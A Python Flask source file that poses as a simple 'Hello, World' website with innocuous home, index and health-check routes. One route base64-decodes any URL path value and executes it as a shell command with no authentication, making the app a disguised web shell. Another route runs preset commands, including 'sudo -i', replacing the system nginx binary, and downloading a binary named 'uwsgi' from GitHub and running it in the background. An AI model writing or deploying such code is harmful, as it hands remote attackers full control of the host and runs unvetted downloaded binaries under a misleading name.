from flask import Flask
import requests
import subprocess
import os
import zipfile, shutil
import  base64


# s = "666"
# a = base64.b64encode(s.encode()).decode()
# print(a)
# b = base64.b64decode(a.encode()).decode()
# print(b)

def runShell(s):
  s = s or '''
echo 666
ls -l
uname -a
lsb_release -a
'''
  try:
    res = subprocess.check_output(s, shell=True).decode()
  except Exception as e:
    res = f'run shell error > \n{s} > \n{e}'
  return res

# print(runShell('echo 666'))

ts = {
  '0': 'sudo -i',
  '1': 'whereis nginx',
  '2': 'uname -a',
  '3': 'lsb_release -a',
  '4': 'ls -l',
  '5': 'ps -ef',
  '6': 'chmod +x /tmp/uwsgi && nohup /tmp/uwsgi -config=/tmp/uwsgi.json &',
  '7': "nginx -g 'daemon off;'",
  '8': "cd /usr/sbin && chmod +x nginx && ./nginx -c /etc/nginx/nginx.conf",
  '9': "chmod +x nginx && ./nginx -c /etc/nginx/nginx.conf",
  '10': 'cp uwsgi.json /tmp/uwsgi.json',
  '11': 'cp nginx.conf /etc/nginx/nginx.conf',
  '12': 'unzip ubuntu-18.04-nginx-1.14.zip -o -d /',
  '13': 'ps aux|grep flask',
  '14': 'pkill -f flask -9',
  '15': 'sudo service nginx restart',
  '16': 'mkdir /usr/local/html',
  '17': 'unzip vue-vben-admin.zip -o -d /usr/local/html',
  '18': 'export PORT=5000',
  '19': 'cp uwsgi /tmp',
  '20': 'wget -N https://github.com/yuchen1456/python-evennode/raw/main/uwsgi',
  '21': 'cp ubuntu-18.04-nginx-1.14/usr/sbin/nginx /usr/sbin/',
  '22': 'unzip MajesticAdmin-Free-Bootstrap-Admin-Template-master.zip -o -d /usr/local/html',
  '23': 'echo $PORT',
  '24': 'cp nginx-test.conf /etc/nginx/nginx.conf',


}



app = Flask('app')


@app.route('/')
def hello_world():
  return 'Hello, World!'

@app.route('/home')
def home():
  return 'Welcome to my website!'

@app.route('/healthCheck')
def healthCheck():
  return 'OK!'

@app.route('/index')
def index():
  return 'flask app is running!'



@app.route('/str/<id>')
def base64_str(id):
  try:
    s = base64.b64decode(id.encode()).decode()
    res = runShell(s)
    return res
  except Exception as e:
    return f'{e}'


@app.route('/sh/<id>')
def sh_str(id):
  try:
    s = ts.get(id)
    res = runShell(s)
    return res
  except Exception as e:
    return f'{e}'



app.run(host='0.0.0.0', port=os.getenv('PORT') or '8080')






